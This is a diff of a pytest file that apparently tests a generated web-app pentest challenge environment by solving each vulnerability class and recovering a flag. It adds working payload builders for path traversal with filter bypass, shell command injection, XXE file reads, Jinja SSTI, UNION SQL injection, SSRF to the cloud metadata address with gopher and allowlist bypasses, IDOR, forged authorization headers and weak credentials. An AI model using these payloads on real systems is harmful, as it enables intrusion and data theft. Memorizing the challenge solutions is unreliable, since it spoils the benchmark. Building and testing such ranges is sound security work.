@@ -8,6 +8,7 @@ HTTP exploit that recovers the flag from the in-memory file store.
 
 from __future__ import annotations
 
+import base64
 import json
 import urllib.error
 import urllib.parse
@@ -144,77 +145,116 @@ def _path_traversal_target(graph: WorldGraph) -> tuple[str, str, str]:
     )
 
 
-def test_path_traversal_episode_recovers_flag(tmp_path: Path) -> None:
-    snap = _admit("file", vuln_kinds={"path_traversal": 1})
-    url_path, param, flag_path = _path_traversal_target(snap.graph)
-    expected = str(snap.graph.nodes["secret_flag"].attrs["value_ref"])
-    pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")
-
-    svc = EpisodeService(WebappPack(), tmp_path)
-    try:
-        handle = svc.start_episode(snap, pentest.id)
-        base = svc.surface(handle)["base_url"]
-        # A real exploit: an absolute path escapes the handler's base dir.
-        exploit = f"{base}{url_path}?{param}={urllib.parse.quote(flag_path)}"
-        recovered = urllib.request.urlopen(exploit, timeout=10).read().decode().strip()
-        assert recovered == expected, recovered
-        (svc.solver_root(handle) / "result.json").write_text(
-            json.dumps({"flag": recovered})
-        )
-        report = svc.stop_episode(handle)
-    finally:
-        svc.close()
-    assert report.passed, report.episode_result.reason
-
-
-def test_command_injection_episode_recovers_flag(tmp_path: Path) -> None:
-    # File loot also serves the code-exec shape: a forced command_injection
-    # oracle, solved by a real shell-metacharacter injection.
-    snap = _admit("file", vuln_kinds={"command_injection": 1})
-    vuln = next(
-        n
-        for n in snap.graph.by_kind("vulnerability")
-        if n.attrs.get("kind") == "command_injection"
-    )
-    params = vuln.attrs["params"]
-    assert isinstance(params, Mapping)
-    endpoint_id = next(e.dst for e in snap.graph.out_edges(vuln.id, "affects"))
-    url_path = str(snap.graph.nodes[endpoint_id].attrs["public_url"])
-    flag_path = _flag_record_key(snap.graph)
-    expected = str(snap.graph.nodes["secret_flag"].attrs["value_ref"])
-    pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")
-
-    quote = params.get("quote", "")
-    if quote == '"':
-        payload = f"$(cat {flag_path})"  # substitution works inside double quotes
-    elif quote == "'":
-        payload = f"x'; cat {flag_path}; echo '"  # break out of single quotes
-    else:
-        payload = f"127.0.0.1; cat {flag_path}"
-
-    svc = EpisodeService(WebappPack(), tmp_path)
-    try:
-        handle = svc.start_episode(snap, pentest.id)
-        base = svc.surface(handle)["base_url"]
-        injection = urllib.parse.quote(payload)
-        exploit = f"{base}{url_path}?{params['target_param']}={injection}"
-        recovered = urllib.request.urlopen(exploit, timeout=10).read().decode().strip()
-        assert recovered == expected, recovered
-        (svc.solver_root(handle) / "result.json").write_text(
-            json.dumps({"flag": recovered})
-        )
-        report = svc.stop_episode(handle)
-    finally:
-        svc.close()
-    assert report.passed, report.episode_result.reason
-
-
 def _flag_record_key(graph: WorldGraph) -> str:
     for record in graph.by_kind("record"):
         for edge in graph.out_edges(record.id, "holds"):
             if graph.nodes[edge.dst].attrs.get("kind") == "flag":
                 return str(record.attrs["key"])
     raise AssertionError("no record holds the flag")
+
+
+def _path_payload(params: Mapping[str, object], path: str) -> str:
+    # The confinement context decides the traversal: absolute / relative ../ /
+    # the ....// that survives a single-pass ../ strip.
+    conf = params.get("confinement", "unconfined")
+    if conf in ("confined", "dotdot_filter"):
+        depth = len([s for s in str(params["base_dir"]).strip("/").split("/") if s])
+        token = "../" if conf == "confined" else "....//"
+        return token * depth + path.lstrip("/")
+    return path
+
+
+def _cmdi_payload(params: Mapping[str, object], path: str) -> str:
+    quote = params.get("quote", "")
+    if quote == '"':
+        return f"$(cat {path})"  # substitution works inside double quotes
+    if quote == "'":
+        return f"x'; cat {path}; echo '"  # break out of single quotes
+    return f"127.0.0.1; cat {path}"
+
+
+def _xxe_payload(params: Mapping[str, object], path: str) -> str:
+    ctx = params.get("entity_context", "element_content")
+    if ctx == "wrapped_root":
+        root = params["root_element"]
+        return (
+            f'<!DOCTYPE {root} [<!ENTITY e SYSTEM "file://{path}">]>'
+            f"<{root}>&e;</{root}>"
+        )
+    if ctx == "scheme_prefix":
+        scheme = params["uri_scheme"]
+        return f'<!DOCTYPE r [<!ENTITY e SYSTEM "{scheme}{path}">]><r>&e;</r>'
+    return f'<!DOCTYPE r [<!ENTITY e SYSTEM "file://{path}">]><r>&e;</r>'
+
+
+def _ssti_payload(params: Mapping[str, object], path: str) -> str:
+    access = "config[" + repr(path) + "]"
+    sink = params.get("render_sink", "raw")
+    if sink == "comment":
+        return "#}{{ " + access + " }}{#"  # close the {# #} the handler adds
+    if sink == "expr":
+        return access  # bare expr: already inside {{ }}
+    return "{{ " + access + " }}"
+
+
+def _sqli_payload(params: Mapping[str, object]) -> str:
+    union = f"UNION SELECT key, {params['leak_column']} FROM {params['table']} -- "
+    ctx = params.get("context", "single")
+    if ctx == "numeric":
+        return f"0 {union}"  # unquoted predicate
+    if ctx == "double":
+        return f'" {union}'  # close the double-quoted literal
+    return f"' {union}"  # close the single-quoted literal
+
+
+def _ssrf_url(params: Mapping[str, object]) -> str:
+    host = params["internal_host"]
+    ctx = params.get("ssrf_filter", "no_filter")
+    if ctx == "scheme_block":
+        return f"gopher://{host}/_admin"  # http blocked; gopher reaches internal
+    if ctx == "host_allowlist_bypass":
+        return f"http://{params['allowed_host']}@{host}/latest/meta-data/"
+    return f"http://{host}/latest/meta-data/"
+
+
+def _idor_id(params: Mapping[str, object], key: str) -> str:
+    ctx = params.get("ref_context", "direct")
+    if ctx == "base64":
+        return base64.b64encode(key.encode()).decode()
+    if ctx == "prefixed":
+        return f"{params['ref_prefix']}{key}"
+    return key
+
+
+def _broken_authz_query(params: Mapping[str, object]) -> str:
+    header = str(params["trust_header"])
+    expected = str(params["expected_value"])
+    ctx = params.get("trust_context", "single_token")
+    if ctx == "encoded_token":
+        forged = {header: expected.encode().hex()}
+    elif ctx == "dual_factor":
+        forged = {
+            header: expected,
+            str(params["confirm_param"]): str(params["confirm_value"]),
+        }
+    else:
+        forged = {header: expected}
+    return urllib.parse.urlencode(forged)
+
+
+def _weak_cred_query(params: Mapping[str, object]) -> str:
+    user, pw = params["weak_user"], params["weak_password"]
+    carrier = str(params["password_param"])
+    fmt = params.get("cred_format", "pair")
+    if fmt == "combined":
+        return f"{carrier}={urllib.parse.quote(f'{user}:{pw}')}"
+    if fmt == "basic":
+        token = base64.b64encode(f"{user}:{pw}".encode()).decode()
+        return f"{carrier}={urllib.parse.quote(token)}"
+    return (
+        f"{params['user_param']}={urllib.parse.quote(str(user))}"
+        f"&{carrier}={urllib.parse.quote(str(pw))}"
+    )
 
 
 def _exploit_url(kind: str, graph: WorldGraph, base: str) -> str:
@@ -225,33 +265,49 @@ def _exploit_url(kind: str, graph: WorldGraph, base: str) -> str:
     assert isinstance(params, Mapping)
     endpoint_id = next(e.dst for e in graph.out_edges(vuln.id, "affects"))
     ep = str(graph.nodes[endpoint_id].attrs["public_url"])
+    stem = f"{base}{ep}"
+
+    def with_param(value: str) -> str:
+        return f"{stem}?{params['target_param']}={urllib.parse.quote(value)}"
+
+    if kind == "path_traversal":
+        return with_param(_path_payload(params, _flag_record_key(graph)))
+    if kind == "command_injection":
+        return with_param(_cmdi_payload(params, _flag_record_key(graph)))
     if kind == "xxe":
-        path = _flag_record_key(graph)
-        xml = f'<!DOCTYPE x [<!ENTITY e SYSTEM "file://{path}">]><x>&e;</x>'
-        return f"{base}{ep}?{params['target_param']}={urllib.parse.quote(xml)}"
+        return with_param(_xxe_payload(params, _flag_record_key(graph)))
     if kind == "ssti":
-        # Real Jinja: dump the injected config that holds the file store.
-        expr = "{{ config[" + repr(_flag_record_key(graph)) + "] }}"
-        return f"{base}{ep}?{params['target_param']}={urllib.parse.quote(expr)}"
+        return with_param(_ssti_payload(params, _flag_record_key(graph)))
+    if kind == "sql_injection":
+        return with_param(_sqli_payload(params))
+    if kind == "ssrf":
+        return with_param(_ssrf_url(params))
     if kind == "idor":
-        rid = _flag_record_key(graph)
-        return f"{base}{ep}?{params['target_param']}={urllib.parse.quote(rid)}"
-    # weak_credentials
-    return (
-        f"{base}{ep}?{params['user_param']}={params['weak_user']}"
-        f"&{params['password_param']}={params['weak_password']}"
-    )
+        return with_param(_idor_id(params, _flag_record_key(graph)))
+    if kind == "broken_authz":
+        return f"{stem}?{_broken_authz_query(params)}"
+    return f"{stem}?{_weak_cred_query(params)}"  # weak_credentials
 
 
 @pytest.mark.parametrize(
     ("loot", "kind"),
-    [("file", "xxe"), ("file", "ssti"), ("db", "idor"), ("db", "weak_credentials")],
+    [
+        ("file", "path_traversal"),
+        ("file", "command_injection"),
+        ("file", "xxe"),
+        ("file", "ssti"),
+        ("db", "sql_injection"),
+        ("db", "ssrf"),
+        ("db", "broken_authz"),
+        ("db", "idor"),
+        ("db", "weak_credentials"),
+    ],
 )
 def test_fanout_class_episode_recovers_flag(
     loot: str, kind: str, tmp_path: Path
 ) -> None:
-    # Each fan-out class is forced as the oracle and solved by its own real
-    # exploit (XXE entity, SSTI expression, IDOR id, default credentials).
+    # Every class is forced as the oracle and solved by its own real,
+    # context-appropriate exploit through the live episode harness.
     snap = _admit(loot, vuln_kinds={kind: 1})
     expected = str(snap.graph.nodes["secret_flag"].attrs["value_ref"])
     pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")
@@ -282,6 +338,13 @@ def test_flag_path_is_discoverable_via_config(tmp_path: Path) -> None:
 
     snap = _admit("file", vuln_kinds={"path_traversal": 1})
     url_path, param, flag_path = _path_traversal_target(snap.graph)
+    pt_vuln = next(
+        n
+        for n in snap.graph.by_kind("vulnerability")
+        if n.attrs.get("kind") == "path_traversal"
+    )
+    params = pt_vuln.attrs["params"]
+    assert isinstance(params, Mapping)
     expected = str(snap.graph.nodes["secret_flag"].attrs["value_ref"])
     pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")
 
@@ -291,7 +354,9 @@ def test_flag_path_is_discoverable_via_config(tmp_path: Path) -> None:
         base = svc.surface(handle)["base_url"]
 
         def read(path: str) -> str:
-            url = f"{base}{url_path}?{param}={urllib.parse.quote(path)}"
+            # Read via this build's confinement-appropriate traversal.
+            payload = urllib.parse.quote(_path_payload(params, path))
+            url = f"{base}{url_path}?{param}={payload}"
             try:
                 body: str = urllib.request.urlopen(url, timeout=10).read().decode()
             except urllib.error.HTTPError:
@@ -338,3 +403,85 @@ def test_path_traversal_wrong_path_recovers_nothing(tmp_path: Path) -> None:
         svc.close()
     assert status == 404
     assert not report.passed
+
+
+def test_context_payload_builders_cover_every_branch() -> None:
+    # A single forced episode samples only one context per class, so exercise
+    # every per-context payload builder here — each must differ by context.
+    p = "/var/lib/app/x/secret.bak"
+    assert _cmdi_payload({"quote": ""}, p).endswith(p)
+    assert _cmdi_payload({"quote": '"'}, p) == f"$(cat {p})"
+    assert _cmdi_payload({"quote": "'"}, p).startswith("x'; cat")
+
+    base = {"base_dir": "/srv/app/public"}
+    assert _path_payload({**base, "confinement": "unconfined"}, p) == p
+    assert _path_payload({**base, "confinement": "confined"}, p).startswith("../")
+    dotdot = _path_payload({**base, "confinement": "dotdot_filter"}, p)
+    assert dotdot.startswith("....//")
+
+    assert "file://" in _xxe_payload({"entity_context": "element_content"}, p)
+    assert "<feed>" in _xxe_payload(
+        {"entity_context": "wrapped_root", "root_element": "feed"}, p
+    )
+    assert "vault://" in _xxe_payload(
+        {"entity_context": "scheme_prefix", "uri_scheme": "vault://"}, p
+    )
+
+    assert _ssti_payload({"render_sink": "raw"}, p).startswith("{{")
+    assert _ssti_payload({"render_sink": "comment"}, p).startswith("#}")
+    assert _ssti_payload({"render_sink": "expr"}, p).startswith("config[")
+
+    sqli = {"table": "t", "leak_column": "c"}
+    assert _sqli_payload({**sqli, "context": "single"}).startswith("'")
+    assert _sqli_payload({**sqli, "context": "numeric"}).startswith("0")
+    assert _sqli_payload({**sqli, "context": "double"}).startswith('"')
+
+    host = {"internal_host": "169.254.169.254", "allowed_host": "ok.com"}
+    assert "gopher://" in _ssrf_url({**host, "ssrf_filter": "scheme_block"})
+    assert "@169" in _ssrf_url({**host, "ssrf_filter": "host_allowlist_bypass"})
+    assert _ssrf_url({**host, "ssrf_filter": "no_filter"}).startswith("http://169")
+
+    assert _idor_id({"ref_context": "direct"}, "k") == "k"
+    assert _idor_id({"ref_context": "base64"}, "k") == base64.b64encode(b"k").decode()
+    assert _idor_id({"ref_context": "prefixed", "ref_prefix": "u-"}, "k") == "u-k"
+
+    authz = {"trust_header": "X-Role", "expected_value": "admin"}
+    assert "X-Role=admin" in _broken_authz_query({**authz, "trust_context": "x"})
+    dual = _broken_authz_query(
+        {
+            **authz,
+            "trust_context": "dual_factor",
+            "confirm_param": "X-Ok",
+            "confirm_value": "1",
+        }
+    )
+    assert "X-Ok=1" in dual
+    encoded = _broken_authz_query({**authz, "trust_context": "encoded_token"})
+    assert "admin" not in encoded
+
+    cred = {
+        "user_param": "u",
+        "password_param": "p",
+        "weak_user": "a",
+        "weak_password": "b",
+    }
+    assert "u=a" in _weak_cred_query({**cred, "cred_format": "pair"})
+    assert _weak_cred_query({**cred, "cred_format": "combined"}) == "p=a%3Ab"
+    assert _weak_cred_query({**cred, "cred_format": "basic"}).startswith("p=")
+
+
+def test_broken_authz_samples_all_trust_contexts() -> None:
+    # The dual_factor branch adds confirm params; one forced episode samples
+    # only one context, so cover all three (incl. the param-adding branch) here.
+    import random
+
+    from cyber_webapp.sampling import default_vuln_params
+
+    node = next(iter(_admit("db").graph.by_kind("endpoint")))
+    seen = set()
+    for seed in range(40):
+        params = default_vuln_params("broken_authz", node, random.Random(seed))
+        seen.add(params["trust_context"])
+        if params["trust_context"] == "dual_factor":
+            assert "confirm_param" in params and "confirm_value" in params
+    assert seen == {"single_token", "dual_factor", "encoded_token"}
